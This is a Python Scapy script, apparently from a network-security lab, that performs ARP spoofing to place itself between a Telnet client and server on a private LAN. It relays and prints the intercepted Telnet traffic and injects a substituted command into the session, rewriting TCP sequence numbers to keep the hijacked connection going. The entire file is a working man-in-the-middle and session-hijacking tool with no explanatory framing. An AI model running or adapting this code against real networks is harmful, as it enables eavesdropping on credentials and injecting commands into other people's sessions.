import sys
import threading
from scapy.all import *
from time import *

server = "192.168.1.116"
telnet_port = 23
spoofed_ip = "192.168.1.114" # victim

interface = "eth0"

IPLayer = IP(dst=server, src=spoofed_ip)

client_mac, client_ip = "08:00:27:1F:23:09", "192.168.1.114"
server_mac, server_ip = "08:00:27:85:06:77", "192.168.1.116"
my_mac = get_if_hwaddr(interface)
my_ip = get_if_addr(interface)

print(f"Hello! My ip is: {my_ip} and mac is {my_mac}")

success = False
t = "" # threading constant
payload = b"ping 192.168.1.111 -c 4\r\n"

extra_seq = 0
success2 = False
this_payload = None

def pkt_handler(pkt):
    try:
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            if pkt[IP].src == client_ip: # from client
                to_server(pkt)
                
                if pkt.haslayer(Raw):
                    raw_data = pkt[Raw].load
                    print(raw_data.decode(errors='ignore'), end=' ', flush=True)   
                    
            elif pkt[IP].src == server_ip: # from server
                to_client(pkt)    
                
                if pkt.haslayer(Raw):
                    raw_data = pkt[Raw].load
                    print(raw_data.decode(errors='ignore'), end=' ', flush=True) 
    except Exception as e:
        print("[pkt_handler]:",e)  

        
def arp_spoof(): # arp spoof
    # me to client: server is at me
    ether_frame_1 = Ether(src=server_mac, dst=client_mac)
    arp_packet_1 = ARP(op=2, hwsrc=my_mac, psrc=server_ip, hwdst=client_mac, pdst=client_ip) 
    pkt_1 = ether_frame_1 / arp_packet_1 # encaps
    threading.Thread(target=jam, args=(pkt_1, t)).start()
    # me to server: client is at me
    ether_frame_2 = Ether(src=client_mac, dst=server_mac)
    arp_packet_2 = ARP(op=2, hwsrc=my_mac, psrc=client_ip, hwdst=server_mac, pdst=server_ip)  
    pkt_2 = ether_frame_2 / arp_packet_2 # encaps
    threading.Thread(target=jam, args=(pkt_2, t)).start()

def jam(pkt, t):
    while True:
        sendp(pkt, iface=interface, verbose=0)
    
def to_client(pkt):
    try:
        global extra_seq, this_payload, success2 
        ether = Ether(src=my_mac, dst=client_mac) # I am the server
        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst) # new layer
        if success2: # when first echo is sent
            tcp = TCP( sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack - extra_seq, flags=pkt[TCP].flags) # new layer
            success2 = False
        else:
            tcp = TCP( sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq - extra_seq, ack=pkt[TCP].ack - extra_seq, flags=pkt[TCP].flags) # new layer

        if pkt.haslayer(Raw): 
            new_pkt = ether / ip / tcp / Raw(load=pkt[Raw].load)
        elif this_payload != None:
            new_pkt = ether / ip / tcp / Raw(this_payload) # for echo
            this_payload = None
        else:
            new_pkt = ether / ip / tcp

        # mismatch
        del new_pkt[IP].len
        del new_pkt[IP].chksum
        del new_pkt[TCP].chksum
        
        sendp(new_pkt, iface=interface, verbose=0)
    except Exception as e:
        print("[to_client]:", e)
    
def to_server(pkt):
    try:
        global success, extra_seq, success2, this_payload
        ether = Ether(src=my_mac, dst=server_mac) # I am the client
        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst) # new layer
        tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq + extra_seq, ack=pkt[TCP].ack + extra_seq, flags=pkt[TCP].flags) # new layer
        
        if pkt.haslayer(Raw) and not success:
            extra_seq = int(len(payload) - len(pkt[Raw].load))
            this_payload = pkt[Raw].load
            tcp.flags = "PA"
            new_pkt = ether / ip / tcp / Raw(load=payload)
            success = True
            success2 = True
        else:
            new_pkt = ether / ip / tcp
            
        # mismatch 
        del new_pkt[IP].len
        del new_pkt[IP].chksum
        del new_pkt[TCP].chksum
        

        sendp(new_pkt, iface=interface, verbose=0)
    except Exception as e:
        print("[to_server]:", e)

try:
    arp_spoof() # STEP 1: JAM  
    sniff(filter="tcp port 23", prn=pkt_handler, store=False, iface=interface)
except Exception as e:
    print(e)
